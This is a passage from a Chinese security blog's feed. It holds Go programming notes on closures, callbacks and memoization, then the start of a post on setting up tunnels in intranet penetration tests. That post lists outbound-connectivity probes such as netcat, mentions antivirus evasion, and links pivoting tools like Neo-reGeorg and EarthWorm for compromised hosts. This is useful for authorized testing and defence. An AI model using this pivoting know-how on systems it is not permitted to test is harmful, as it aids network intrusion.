class="number">13</span></span><br><span class="line">fibonacci(<span class="number">7</span>) is: <span class="number">21</span></span><br><span class="line">fibonacci(<span class="number">8</span>) is: <span class="number">34</span></span><br><span class="line">fibonacci(<span class="number">9</span>) is: <span class="number">55</span></span><br><span class="line">fibonacci(<span class="number">10</span>) is: <span class="number">89</span></span><br></pre></td></tr></table></figure><h3 id="将函数作为参数"><a href="#将函数作为参数" class="headerlink" title="将函数作为参数"></a>将函数作为参数</h3><p>函数可以作为其它函数的参数进行传递，然后在其它函数内调用执行，一般称之为回调 <code>callback</code>。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    callback(<span class="number">1</span>, Add)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Add</span><span class="params">(a, b <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;The sum of %d and %d is: %d\n&quot;</span>, a, b, a+b)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">callback</span><span class="params">(y <span class="keyword">int</span>, f <span class="keyword">func</span>(<span class="keyword">int</span>, <span class="keyword">int</span>)</span>)</span> &#123;</span><br><span class="line">    f(y, <span class="number">2</span>) <span class="comment">// this becomes Add(1, 2)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line"></span><br><span class="line">The sum of <span class="number">1</span> and <span class="number">2</span> is: <span class="number">3</span></span><br></pre></td></tr></table></figure><h3 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h3><p>当我们不希望给函数起名字的时候，可以使用匿名函数，例如：<code>func(x, y int) int &#123; return x + y &#125;</code>。</p><p>这样的一个函数不能够独立存在（编译器会返回错误：<code>non-declaration statement outside function body</code>），但可以被赋值于某个变量，即保存函数的地址到变量中：<code>fplus := func(x, y int) int &#123; return x + y &#125;</code>，然后通过变量名对函数进行调用：<code>fplus(3,4)</code>。</p><p>当然，您也可以直接对匿名函数进行调用：<code>func(x, y int) int &#123; return x + y &#125; (3, 4)</code>。</p><h3 id="应用闭包：将函数作为返回值"><a href="#应用闭包：将函数作为返回值" class="headerlink" title="应用闭包：将函数作为返回值"></a>应用闭包：将函数作为返回值</h3><p><a href="https://www.kancloud.cn/kancloud/the-way-to-go/72481">https://www.kancloud.cn/kancloud/the-way-to-go/72481</a></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// make an Add2 function, give it a name p2, and call it:</span></span><br><span class="line">    p2 := Add2()</span><br><span class="line">    fmt.Printf(<span class="string">&quot;Call Add2 for 3 gives: %v\n&quot;</span>, p2(<span class="number">3</span>))</span><br><span class="line">    <span class="comment">// make a special Adder function, a gets value 3:</span></span><br><span class="line">    TwoAdder := Adder(<span class="number">2</span>)</span><br><span class="line">    fmt.Printf(<span class="string">&quot;The result is: %v\n&quot;</span>, TwoAdder(<span class="number">3</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Add2</span><span class="params">()</span> <span class="title">func</span><span class="params">(b <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(b <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">        <span class="keyword">return</span> b + <span class="number">2</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Adder</span><span class="params">(a <span class="keyword">int</span>)</span> <span class="title">func</span><span class="params">(b <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(b <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">        <span class="keyword">return</span> a + b</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line"></span><br><span class="line">Call Add2 <span class="keyword">for</span> <span class="number">3</span> gives: <span class="number">5</span></span><br><span class="line">The result is: <span class="number">5</span></span><br></pre></td></tr></table></figure><h3 id="使用闭包调试"><a href="#使用闭包调试" class="headerlink" title="使用闭包调试"></a>使用闭包调试</h3><p>能够准确地知道哪个文件中的具体哪个函数正在执行，对于调试是十分有帮助的。您可以使用 <code>runtime</code> 或 <code>log</code> 包中的特殊函数来实现这样的功能。包<code>runtime</code> 中的函数 <code>Caller()</code> 提供了相应的信息，因此可以在需要的时候实现一个 <code>where()</code> 闭包函数来打印函数执行的位置：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">where := <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">    _, file, line, _ := runtime.Caller(<span class="number">1</span>)</span><br><span class="line">    log.Printf(<span class="string">&quot;%s:%d&quot;</span>, file, line)</span><br><span class="line">&#125;</span><br><span class="line">where()</span><br><span class="line"><span class="comment">// some code</span></span><br><span class="line">where()</span><br><span class="line"><span class="comment">// some more code</span></span><br><span class="line">where()</span><br></pre></td></tr></table></figure><p>您也可以设置 <code>log</code> 包中的 flag 参数来实现：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">log.SetFlags(log.Llongfile)</span><br><span class="line">log.Print(<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>或使用一个更加简短版本的 <code>where</code> 函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> where = log.Print</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">func1</span><span class="params">()</span></span> &#123;</span><br><span class="line">where()</span><br><span class="line">... some code</span><br><span class="line">where()</span><br><span class="line">... some code</span><br><span class="line">where()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="计算函数执行时间"><a href="#计算函数执行时间" class="headerlink" title="计算函数执行时间"></a>计算函数执行时间</h3><p>在计算开始之前设置一个起始时候，再由计算结束时的结束时间，最后取出它们的差值，就是这个计算所消耗的时间。想要实现这样的做法，可以使用 <code>time</code> 包中的 <code>Now()</code> 和 <code>Sub</code> 函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">start := time.Now()</span><br><span class="line">longCalculation()</span><br><span class="line">end := time.Now()</span><br><span class="line">delta := end.Sub(start)</span><br><span class="line">fmt.Printf(<span class="string">&quot;longCalculation took this amount of time: %s\n&quot;</span>, delta)</span><br></pre></td></tr></table></figure><h3 id="通过内存缓存来提升性能"><a href="#通过内存缓存来提升性能" class="headerlink" title="通过内存缓存来提升性能"></a>通过内存缓存来提升性能</h3><p>进行大量的计算时，提升性能最直接有效的一种方式就是避免重复计算。通过在内存中缓存和重复利用相同计算的结果，称之为内存缓存。最明显的例子就是生成斐波那契数列的程序</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> LIM = <span class="number">41</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fibs [LIM]<span class="keyword">uint64</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> result <span class="keyword">uint64</span> = <span class="number">0</span></span><br><span class="line">    start := time.Now()</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; LIM; i++ &#123;</span><br><span class="line">        result = fibonacci(i)</span><br><span class="line">        fmt.Printf(<span class="string">&quot;fibonacci(%d) is: %d\n&quot;</span>, i, result)</span><br><span class="line">    &#125;</span><br><span class="line">    end := time.Now()</span><br><span class="line">    delta := end.Sub(start)</span><br><span class="line">    fmt.Printf(<span class="string">&quot;longCalculation took this amount of time: %s\n&quot;</span>, delta)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">fibonacci</span><span class="params">(n <span class="keyword">int</span>)</span> <span class="params">(res <span class="keyword">uint64</span>)</span></span> &#123;</span><br><span class="line">    <span class="comment">// memoization: check if fibonacci(n) is already known in array:</span></span><br><span class="line">    <span class="keyword">if</span> fibs[n] != <span class="number">0</span> &#123;</span><br><span class="line">        res = fibs[n]</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">1</span> &#123;</span><br><span class="line">        res = <span class="number">1</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res = fibonacci(n<span class="number">-1</span>) + fibonacci(n<span class="number">-2</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    fibs[n] = res</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="数组与切片"><a href="#数组与切片" class="headerlink" title="数组与切片"></a>数组与切片</h2><h3 id="声明和初始化"><a href="#声明和初始化" class="headerlink" title="声明和初始化"></a>声明和初始化</h3><h3 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h3><h3 id="For-range-结构"><a href="#For-range-结构" class="headerlink" title="For-range 结构"></a>For-range 结构</h3><h3 id="切片重组（reslice）"><a href="#切片重组（reslice）" class="headerlink" title="切片重组（reslice）"></a>切片重组（reslice）</h3><h3 id="切片的复制与追加"><a href="#切片的复制与追加" class="headerlink" title="切片的复制与追加"></a>切片的复制与追加</h3><h3 id="字符串、数组和切片的应用"><a href="#字符串、数组和切片的应用" class="headerlink" title="字符串、数组和切片的应用"></a>字符串、数组和切片的应用</h3><h2 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h2><h3 id="声明、初始化和-make"><a href="#声明、初始化和-make" class="headerlink" title="声明、初始化和 make"></a>声明、初始化和 make</h3><h3 id="测试键值对是否存在及删除元素"><a href="#测试键值对是否存在及删除元素" class="headerlink" title="测试键值对是否存在及删除元素"></a>测试键值对是否存在及删除元素</h3><h3 id="for-range-的配套用法"><a href="#for-range-的配套用法" class="headerlink" title="for-range 的配套用法"></a>for-range 的配套用法</h3><h3 id="map-类型的切片"><a href="#map-类型的切片" class="headerlink" title="map 类型的切片"></a>map 类型的切片</h3><h3 id="map-的排序"><a href="#map-的排序" class="headerlink" title="map 的排序"></a>map 的排序</h3><h3 id="将-map-的键值对调"><a href="#将-map-的键值对调" class="headerlink" title="将 map 的键值对调"></a>将 map 的键值对调</h3><h2 id="包（package）"><a href="#包（package）" class="headerlink" title="包（package）"></a>包（package）</h2><h3 id="标准库概述"><a href="#标准库概述" class="headerlink" title="标准库概述"></a>标准库概述</h3><h3 id="regexp-包"><a href="#regexp-包" class="headerlink" title="regexp 包"></a>regexp 包</h3><h3 id="锁和-sync-包"><a href="#锁和-sync-包" class="headerlink" title="锁和 sync 包"></a>锁和 sync 包</h3><h3 id="精密计算和-big-包"><a href="#精密计算和-big-包" class="headerlink" title="精密计算和 big 包"></a>精密计算和 big 包</h3><h3 id="自定义包和可见性"><a href="#自定义包和可见性" class="headerlink" title="自定义包和可见性"></a>自定义包和可见性</h3><h3 id="为自定义包使用-godoc"><a href="#为自定义包使用-godoc" class="headerlink" title="为自定义包使用 godoc"></a>为自定义包使用 godoc</h3><h3 id="使用-go-install-安装自定义包"><a href="#使用-go-install-安装自定义包" class="headerlink" title="使用 go install 安装自定义包"></a>使用 go install 安装自定义包</h3><h3 id="自定义包的目录结构、go-install-和-go-test"><a href="#自定义包的目录结构、go-install-和-go-test" class="headerlink" title="自定义包的目录结构、go install 和 go test"></a>自定义包的目录结构、go install 和 go test</h3><h3 id="通过-Git-打包和安装"><a href="#通过-Git-打包和安装" class="headerlink" title="通过 Git 打包和安装"></a>通过 Git 打包和安装</h3><h3 id="Go-的外部包和项目"><a href="#Go-的外部包和项目" class="headerlink" title="Go 的外部包和项目"></a>Go 的外部包和项目</h3><h2 id="结构（struct）与方法（method）"><a href="#结构（struct）与方法（method）" class="headerlink" title="结构（struct）与方法（method）"></a>结构（struct）与方法（method）</h2><h3 id="结构体定义"><a href="#结构体定义" class="headerlink" title="结构体定义"></a>结构体定义</h3><h3 id="使用工厂方法创建结构体实例"><a href="#使用工厂方法创建结构体实例" class="headerlink" title="使用工厂方法创建结构体实例"></a>使用工厂方法创建结构体实例</h3><h3 id="使用自定义包中的结构体"><a href="#使用自定义包中的结构体" class="headerlink" title="使用自定义包中的结构体"></a>使用自定义包中的结构体</h3><h3 id="带标签的结构体"><a href="#带标签的结构体" class="headerlink" title="带标签的结构体"></a>带标签的结构体</h3><h3 id="匿名字段和内嵌结构体"><a href="#匿名字段和内嵌结构体" class="headerlink" title="匿名字段和内嵌结构体"></a>匿名字段和内嵌结构体</h3><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><h3 id="垃圾回收和-SetFinalizer"><a href="#垃圾回收和-SetFinalizer" class="headerlink" title="垃圾回收和 SetFinalizer"></a>垃圾回收和 SetFinalizer</h3><h2 id="接口（interface）与反射（reflection）"><a href="#接口（interface）与反射（reflection）" class="headerlink" title="接口（interface）与反射（reflection）"></a>接口（interface）与反射（reflection）</h2><h3 id="接口是什么"><a href="#接口是什么" class="headerlink" title="接口是什么"></a>接口是什么</h3><h3 id="接口嵌套接口"><a href="#接口嵌套接口" class="headerlink" title="接口嵌套接口"></a>接口嵌套接口</h3><h3 id="类型断言：如何检测和转换接口变量的类型"><a href="#类型断言：如何检测和转换接口变量的类型" class="headerlink" title="类型断言：如何检测和转换接口变量的类型"></a>类型断言：如何检测和转换接口变量的类型</h3><h3 id="类型判断：type-switch"><a href="#类型判断：type-switch" class="headerlink" title="类型判断：type-switch"></a>类型判断：type-switch</h3><h3 id="测试一个值是否实现了某个接口"><a href="#测试一个值是否实现了某个接口" class="headerlink" title="测试一个值是否实现了某个接口"></a>测试一个值是否实现了某个接口</h3><h3 id="使用方法集与接口"><a href="#使用方法集与接口" class="headerlink" title="使用方法集与接口"></a>使用方法集与接口</h3><h3 id="第一个例子：使用-Sorter-接口排序"><a href="#第一个例子：使用-Sorter-接口排序" class="headerlink" title="第一个例子：使用 Sorter 接口排序"></a>第一个例子：使用 Sorter 接口排序</h3><h3 id="第二个例子：读和写"><a href="#第二个例子：读和写" class="headerlink" title="第二个例子：读和写"></a>第二个例子：读和写</h3><h3 id="空接口"><a href="#空接口" class="headerlink" title="空接口"></a>空接口</h3><h3 id="反射包"><a href="#反射包" class="headerlink" title="反射包"></a>反射包</h3><h1 id="Go-高级编程"><a href="#Go-高级编程" class="headerlink" title="Go 高级编程"></a>Go 高级编程</h1><h2 id="读写数据"><a href="#读写数据" class="headerlink" title="读写数据"></a>读写数据</h2><h3 id="读取用户的输入"><a href="#读取用户的输入" class="headerlink" title="读取用户的输入"></a>读取用户的输入</h3><h3 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h3><h3 id="文件拷贝"><a href="#文件拷贝" class="headerlink" title="文件拷贝"></a>文件拷贝</h3><h3 id="从命令行读取参数"><a href="#从命令行读取参数" class="headerlink" title="从命令行读取参数"></a>从命令行读取参数</h3><h3 id="用buffer读取文件"><a href="#用buffer读取文件" class="headerlink" title="用buffer读取文件"></a>用buffer读取文件</h3><h3 id="用切片读写文件"><a href="#用切片读写文件" class="headerlink" title="用切片读写文件"></a>用切片读写文件</h3><h3 id="用-defer-关闭文件"><a href="#用-defer-关闭文件" class="headerlink" title="用 defer 关闭文件"></a>用 defer 关闭文件</h3><h3 id="使用接口的实际例子：fmt-Fprintf"><a href="#使用接口的实际例子：fmt-Fprintf" class="headerlink" title="使用接口的实际例子：fmt.Fprintf"></a>使用接口的实际例子：fmt.Fprintf</h3><h3 id="Json-数据格式"><a href="#Json-数据格式" class="headerlink" title="Json 数据格式"></a>Json 数据格式</h3><h3 id="XML-数据格式"><a href="#XML-数据格式" class="headerlink" title="XML 数据格式"></a>XML 数据格式</h3><h3 id="用-Gob-传输数据"><a href="#用-Gob-传输数据" class="headerlink" title="用 Gob 传输数据"></a>用 Gob 传输数据</h3><h3 id="Go-中的密码学"><a href="#Go-中的密码学" class="headerlink" title="Go 中的密码学"></a>Go 中的密码学</h3><h2 id="错误处理与测试"><a href="#错误处理与测试" class="headerlink" title="错误处理与测试"></a>错误处理与测试</h2><h3 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h3><h3 id="运行时异常和-panic"><a href="#运行时异常和-panic" class="headerlink" title="运行时异常和 panic"></a>运行时异常和 panic</h3><h3 id="从-panic-中恢复（Recover）"><a href="#从-panic-中恢复（Recover）" class="headerlink" title="从 panic 中恢复（Recover）"></a>从 panic 中恢复（Recover）</h3><h3 id="自定义包中的错误处理和-panicking"><a href="#自定义包中的错误处理和-panicking" class="headerlink" title="自定义包中的错误处理和 panicking"></a>自定义包中的错误处理和 panicking</h3><h3 id="一种用闭包处理错误的模式"><a href="#一种用闭包处理错误的模式" class="headerlink" title="一种用闭包处理错误的模式"></a>一种用闭包处理错误的模式</h3><h3 id="启动外部命令和程序"><a href="#启动外部命令和程序" class="headerlink" title="启动外部命令和程序"></a>启动外部命令和程序</h3><h3 id="Go-中的单元测试和基准测试"><a href="#Go-中的单元测试和基准测试" class="headerlink" title="Go 中的单元测试和基准测试"></a>Go 中的单元测试和基准测试</h3><h3 id="测试的具体例子"><a href="#测试的具体例子" class="headerlink" title="测试的具体例子"></a>测试的具体例子</h3><h3 id="用（测试数据）表驱动测试"><a href="#用（测试数据）表驱动测试" class="headerlink" title="用（测试数据）表驱动测试"></a>用（测试数据）表驱动测试</h3><h3 id="性能调试：分析并优化"><a href="#性能调试：分析并优化" class="headerlink" title="性能调试：分析并优化"></a>性能调试：分析并优化</h3><h2 id="协程（goroutine）与通道（channel）"><a href="#协程（goroutine）与通道（channel）" class="headerlink" title="协程（goroutine）与通道（channel）"></a>协程（goroutine）与通道（channel）</h2><h3 id="并发、并行和协程"><a href="#并发、并行和协程" class="headerlink" title="并发、并行和协程"></a>并发、并行和协程</h3><h3 id="使用通道进行协程间通信"><a href="#使用通道进行协程间通信" class="headerlink" title="使用通道进行协程间通信"></a>使用通道进行协程间通信</h3><h3 id="协程同步：关闭通道-对阻塞的通道进行测试"><a href="#协程同步：关闭通道-对阻塞的通道进行测试" class="headerlink" title="协程同步：关闭通道-对阻塞的通道进行测试"></a>协程同步：关闭通道-对阻塞的通道进行测试</h3><h3 id="使用-select-切换协程"><a href="#使用-select-切换协程" class="headerlink" title="使用 select 切换协程"></a>使用 select 切换协程</h3><h3 id="通道，超时和计时器（Ticker）"><a href="#通道，超时和计时器（Ticker）" class="headerlink" title="通道，超时和计时器（Ticker）"></a>通道，超时和计时器（Ticker）</h3><h3 id="协程和恢复（recover）"><a href="#协程和恢复（recover）" class="headerlink" title="协程和恢复（recover）"></a>协程和恢复（recover）</h3><h2 id="网络、模版与网页应用"><a href="#网络、模版与网页应用" class="headerlink" title="网络、模版与网页应用"></a>网络、模版与网页应用</h2><h3 id="tcp服务器"><a href="#tcp服务器" class="headerlink" title="tcp服务器"></a>tcp服务器</h3><h3 id="一个简单的web服务器"><a href="#一个简单的web服务器" class="headerlink" title="一个简单的web服务器"></a>一个简单的web服务器</h3><h3 id="访问并读取页面数据"><a href="#访问并读取页面数据" class="headerlink" title="访问并读取页面数据"></a>访问并读取页面数据</h3><h3 id="写一个简单的网页应用"><a href="#写一个简单的网页应用" class="headerlink" title="写一个简单的网页应用"></a>写一个简单的网页应用</h3><h1 id="实际应用"><a href="#实际应用" class="headerlink" title="实际应用"></a>实际应用</h1><h2 id="常见的陷阱与错误"><a href="#常见的陷阱与错误" class="headerlink" title="常见的陷阱与错误"></a>常见的陷阱与错误</h2><h3 id="误用短声明导致变量覆盖"><a href="#误用短声明导致变量覆盖" class="headerlink" title="误用短声明导致变量覆盖"></a>误用短声明导致变量覆盖</h3><h3 id="误用字符串"><a href="#误用字符串" class="headerlink" title="误用字符串"></a>误用字符串</h3><h3 id="发生错误时使用defer关闭一个文件"><a href="#发生错误时使用defer关闭一个文件" class="headerlink" title="发生错误时使用defer关闭一个文件"></a>发生错误时使用defer关闭一个文件</h3><h3 id="不需要将一个指向切片的指针传递给函数"><a href="#不需要将一个指向切片的指针传递给函数" class="headerlink" title="不需要将一个指向切片的指针传递给函数"></a>不需要将一个指向切片的指针传递给函数</h3><h3 id="使用指针指向接口类型"><a href="#使用指针指向接口类型" class="headerlink" title="使用指针指向接口类型"></a>使用指针指向接口类型</h3><h3 id="使用值类型时误用指针"><a href="#使用值类型时误用指针" class="headerlink" title="使用值类型时误用指针"></a>使用值类型时误用指针</h3><h3 id="误用协程和通道"><a href="#误用协程和通道" class="headerlink" title="误用协程和通道"></a>误用协程和通道</h3><h3 id="闭包和协程的使用"><a href="#闭包和协程的使用" class="headerlink" title="闭包和协程的使用"></a>闭包和协程的使用</h3><h3 id="糟糕的错误处理"><a href="#糟糕的错误处理" class="headerlink" title="糟糕的错误处理"></a>糟糕的错误处理</h3><h2 id="模式"><a href="#模式" class="headerlink" title="模式"></a>模式</h2><h3 id="关于逗号ok模式"><a href="#关于逗号ok模式" class="headerlink" title="关于逗号ok模式"></a>关于逗号ok模式</h3><h2 id="出于性能考虑的实用代码片段"><a href="#出于性能考虑的实用代码片段" class="headerlink" title="出于性能考虑的实用代码片段"></a>出于性能考虑的实用代码片段</h2><h3 id="字符串-1"><a href="#字符串-1" class="headerlink" title="字符串"></a>字符串</h3><h3 id="数组和切片"><a href="#数组和切片" class="headerlink" title="数组和切片"></a>数组和切片</h3><h3 id="映射"><a href="#映射" class="headerlink" title="映射"></a>映射</h3><h3 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h3><h3 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h3><h3 id="函数-1"><a href="#函数-1" class="headerlink" title="函数"></a>函数</h3><h3 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h3><h3 id="协程（goroutine）与通道（channel）-1"><a href="#协程（goroutine）与通道（channel）-1" class="headerlink" title="协程（goroutine）与通道（channel）"></a>协程（goroutine）与通道（channel）</h3><h3 id="网络和网页应用"><a href="#网络和网页应用" class="headerlink" title="网络和网页应用"></a>网络和网页应用</h3><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><h3 id="出于性能考虑的最佳实践和建议"><a href="#出于性能考虑的最佳实践和建议" class="headerlink" title="出于性能考虑的最佳实践和建议"></a>出于性能考虑的最佳实践和建议</h3>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;参考（Ctrl c+v） &lt;a href=&quot;https://www.kancloud.cn/kancloud/the-way-to-go/&quot;&gt;https://www.kancloud.cn/kancloud/the-way-to-go/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;当个学习笔记，只记录重点。&lt;/p&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="Golang" scheme="https://www.se7ensec.cn/tags/Golang/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透|内网传输通道的建立</title>
    <link href="https://www.se7ensec.cn/2021/04/03/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E4%BC%A0%E8%BE%93%E9%80%9A%E9%81%93%E7%9A%84%E5%BB%BA%E7%AB%8B/"/>
    <id>https://www.se7ensec.cn/2021/04/03/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E4%BC%A0%E8%BE%93%E9%80%9A%E9%81%93%E7%9A%84%E5%BB%BA%E7%AB%8B/</id>
    <published>2021-04-03T14:10:24.000Z</published>
    <updated>2021-10-13T02:41:47.133Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>内网传输通道的建立。</p></blockquote><a id="more"></a><h1 id="判断是否出网"><a href="#判断是否出网" class="headerlink" title="判断是否出网"></a>判断是否出网</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ping : icmp</span><br><span class="line">curl : http </span><br><span class="line">nslookup : dns </span><br><span class="line">nc ip port : tcp</span><br></pre></td></tr></table></figure><p>内网渗透网络环境复杂且工具繁多，有时还要考虑免杀，理解了原理找到适合自己的即可，本文也不会过多写工具的使用，有空更新下使用命令~</p><h1 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>正向代理，意思是一个位于客户端和原始服务器(origin server)之间的服务器，为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标(原始服务器)，然后代理向原始服务器转交请求并将获得的内容返回给客户端，客户端才能使用正向代理。</p><h2 id="使用情景"><a href="#使用情景" class="headerlink" title="使用情景"></a>使用情景</h2><blockquote><p><strong>注意：不需要公网的vps</strong></p></blockquote><p>1.目标主机拥有公网IP。</p><p> 常用工具：</p><p><a href="https://github.com/EddieIvan01/iox">https://github.com/EddieIvan01/iox</a></p><p><a href="http://rootkiter.com/EarthWorm/">http://rootkiter.com/EarthWorm/</a></p><p>2.目标主机存在WEB服务且不通外网，支持动态脚本PHP、ASPX、JSP。</p><p>常用工具：</p><p><a href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a></p><p><a href="https://github.com/FunnyWolf/pystinger">https://github.com/FunnyWolf/pystinger</a></p><p><a href="https://github.com/blackarrowsec/pivotnacci">https://github.com/blackarrowsec/pivotnacci</a></p><h1 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h1><h2 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h2><p>反向代理服务器位于用户与目标服务器之间，但是对于用户而言，反向代理服务器就相当于目标服务器，即用户直接访问反向代理服务器就可以获得目标服务器的资源。</p><h2 id="使用情景-1"><a href="#使用情景-1" class="headerlink" title="使用情景"></a>使用情景</h2><blockquote><p><strong>注意：需要公网的vps</strong></p></blockquote><p>目标主机通外网即可。</p><p>常用工具：</p><p><a 